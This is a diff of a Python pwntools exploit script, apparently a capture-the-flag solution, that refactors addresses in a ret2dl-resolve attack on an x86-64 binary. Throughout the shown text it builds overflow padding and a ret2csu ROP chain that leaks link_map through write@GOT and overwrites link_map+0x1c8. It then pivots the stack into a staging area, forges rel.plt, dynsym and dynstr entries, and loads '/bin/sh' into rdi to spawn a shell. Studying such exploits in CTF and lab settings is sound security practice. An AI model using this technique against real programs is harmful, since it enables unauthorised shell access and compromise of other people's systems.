@@ -15,6 +15,19 @@ p4_ret      = 0x000000000040089c
 
 adr_stage   = 0x0000000000601000 + 0x800
 
+adr_rel_plt         = 0x0000000000400498
+adr_dyn_sym         = 0x00000000004002c0
+adr_dyn_str         = 0x00000000004003c8
+adr_fake_rel_plt    = adr_stage + 0x100
+adr_fake_dyn_sym    = adr_stage + 0x208
+adr_fake_dyn_str    = adr_stage + 0x300
+adr_shell           = adr_stage + 0x400
+
+com_part1           = 0x40089a
+com_part2           = 0x400880
+
+adr_entry           = 0x400630
+
 def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
     payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
     payload += l64(0x0)     # rbx be 0x0
@@ -30,11 +43,11 @@ def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
 # leak link_map
 payload0  = 'A' * 24
 payload0 += l64(p4_ret)
-payload0 += com_gadget(0x40089a, 0x400880, got_write,
+payload0 += com_gadget(com_part1, com_part2, got_write,
         arg1 = 0x1,
         arg2 = got_linkmap,
         arg3 = 0x8)
-payload0 += l64(0x400630)
+payload0 += l64(adr_entry)
 
 io.rl()
 io.wl(payload0)
@@ -44,32 +57,23 @@ print '[+] leak link_map\t:\t' + hex(adr_linkmap)
 # overwrite link_map+0x1c8 0x0, read fake structure
 payload0  = 'A' * 24
 payload0 += l64(p4_ret)
-payload0 += com_gadget(0x40089a, 0x400880, got_read,
+payload0 += com_gadget(com_part1, com_part2, got_read,
         arg1 = 0x0,
         arg2 = adr_linkmap + 0x1c8,
         arg3 = 0x8)
-payload0 += com_gadget(0x40089a, 0x400880, got_read,
+payload0 += com_gadget(com_part1, com_part2, got_read,
         arg1 = 0x0,
         arg2 = adr_stage,
         arg3 = 0x500)
 payload0 += l64(pop_rbp_ret)
 payload0 += l64(adr_stage)
 payload0 += l64(leave_ret)
-# payload0 += l64(plt_resolve)
 
 io.rl()
 io.wl(payload0)
 io.w(l64(0x0))
 
 # fake structure
-adr_rel_plt         = 0x0000000000400498
-adr_dyn_sym         = 0x00000000004002c0
-adr_dyn_str         = 0x00000000004003c8
-adr_fake_rel_plt    = adr_stage + 0x100
-adr_fake_dyn_sym    = adr_stage + 0x208
-adr_fake_dyn_str    = adr_stage + 0x300
-adr_shell           = adr_stage + 0x400
-
 align_rel_plt   = 0x8*3 - (adr_fake_rel_plt - adr_rel_plt) % (0x8 * 3)
 payload1  = 'A' * 0x8
 payload1 += l64(pop_rdi_ret) # set $rdi "/bin/sh"
